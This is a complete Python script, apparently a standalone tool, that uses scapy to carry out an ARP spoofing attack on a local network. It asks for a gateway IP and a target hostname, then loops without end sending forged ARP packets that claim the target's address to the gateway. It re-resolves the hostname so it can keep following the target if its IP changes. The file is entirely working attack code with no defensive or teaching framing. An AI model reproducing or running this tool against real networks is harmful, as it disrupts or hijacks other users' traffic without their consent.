import os
from scapy.all import *

gatewayIP = '192.168.170.254'


def arpattack(gatewayIP, targetIP, hostName):
    print('[Info] Attack start, target hostname:', hostName)
    while True:
        exitIndicator = False
        while exitIndicator == False:
            print('[Info] Target IP:', targetIP)
            pkt = ARP(psrc=targetIP, pdst=gatewayIP, op=1)
            srloop(pkt, inter=2, count=8)
            try:
                newIP = socket.gethostbyname(hostName)
            except:
                print('[Warning] Unable to resolve host')
            if newIP != targetIP:
                exitIndicator = True
                print('[Warning] Target IP changed from', targetIP, 'to', newIP)
        targetIP = newIP


def main():
    stat = 1
    while stat != 0:
        gatewayIP = input('Please enter gateway IP: ')
        hostName = input('Please enter hostname: ')
        stat = 0
        if hostName == 'exit':
            print('[Info] Exit')
            return (2)
    try:
        targetIP = socket.gethostbyname(hostName)
        print('Target:', targetIP)

    except Exception as e:
        print('[Fatal] {}'.format(e))
        return (1)

    try:
        arpattack(gatewayIP, targetIP, hostName)

    except KeyboardInterrupt:
        print('[Info] Break')
        return (1)
    except Exception as f:
        print('[Fatal] {}'.format(f))
        return (1)


if __name__ == '__main__':
    while True:
        if main() == 2:
            print('[Info] Exit')
            break